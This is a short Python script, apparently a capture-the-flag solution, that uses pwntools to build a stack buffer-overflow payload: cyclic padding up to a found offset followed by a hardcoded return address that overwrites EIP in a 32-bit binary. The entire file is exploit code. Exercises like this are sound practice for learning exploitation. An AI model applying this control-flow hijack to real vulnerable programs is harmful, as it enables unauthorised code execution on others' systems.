#!/usr/bin/env python
import sys
from pwn import *

#padding = cyclic(100)
#print ("padding : " + str(padding))
padding = cyclic(cyclic_find('jaaa'))
#print ("padding_cyclic : " + str(padding))
eip = p32(0x8048536)
payload = padding + eip
print (payload)
#print("payload " +str(payload))